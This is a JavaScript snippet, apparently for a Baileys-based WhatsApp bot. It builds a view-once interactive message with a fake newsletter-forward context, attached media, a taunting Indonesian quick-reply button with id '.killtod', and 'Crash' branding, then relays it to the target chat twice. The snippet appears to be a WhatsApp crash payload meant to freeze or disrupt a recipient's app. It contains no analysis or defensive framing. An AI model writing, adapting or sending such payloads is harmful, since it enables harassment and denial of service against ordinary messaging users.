let msg = {
viewOnceMessage: {
message: {
interactiveMessage: {
"contextInfo": {
"mentionedJid": [m.sender],
"isForwarded": true,
"forwardedNewsletterMessageInfo": {
"newsletterJid": '0@newsletter',
"newsletterName": 'ↈ𝐀𝐥𝐰𝐚𝐲𝐬𝘠𝘢𝘯𝘻.ʏᴀɴᴅᴇx.ᴄᴏᴍᬊᬁ',
"serverMessageId": 1
},
},
"header": {
"title": ``,
...(await prepareWAMessageMedia({ image: mengkece }, { upload: qio.waUploadToServer })),
"hasMediaAttachment": true
},
"body": {
"text": ""
},
"footer": {
"text": "ⓧ𝐀𝐥𝐰𝐚𝐲𝐬𝘠𝘢𝘯𝘻Cʀᴀsʜ.ᴡʜᴀᴛsᴀᴘᴘ.ᴄᴏᴍ༻"
},
"nativeFlowMessage": {
"buttons": [
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"𝐀𝐥𝐰𝐚𝐲𝐬𝘠𝘢𝘯𝘻\nSinilah Wahai Anak Kecil😋😘\",\"id\":\".killtod\"}"
}
],
"messageParamsJson": ""
}
}
}
}
}

qio.relayMessage(m.chat, msg, {});

> let target = m.chat

async function ngaceng() {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
interactiveMessage: {
"contextInfo": {
"mentionedJid": [m.sender],
"isForwarded": true,
"forwardedNewsletterMessageInfo": {
"newsletterJid": '0@newsletter',
"newsletterName": 'ↈ𝐀𝐥𝐰𝐚𝐲𝐬𝘠𝘢𝘯𝘻.ʏᴀɴᴅᴇx.ᴄᴏᴍᬊᬁ',
"serverMessageId": 1
},
},
"header": {
"title": ``,
...(await prepareWAMessageMedia({ image: mengkece }, { upload: qio.waUploadToServer })),
"hasMediaAttachment": true
},
"body": {
"text": ""
},
"footer": {
"text": "ⓧ𝐀𝐥𝐰𝐚𝐲𝐬𝘠𝘢𝘯𝘻Cʀᴀsʜ.ᴡʜᴀᴛsᴀᴘᴘ.ᴄᴏᴍ༻"
},
"nativeFlowMessage": {
"buttons": [
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"𝐀𝐥𝐰𝐚𝐲𝐬𝘠𝘢𝘯𝘻\nSinilah Wahai Anak Kecil😋😘\",\"id\":\".killtod\"}"
}
],
"messageParamsJson": ""
}
}
}
}
}), { userJid: target, quoted: m })
await qio.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}

ngaceng()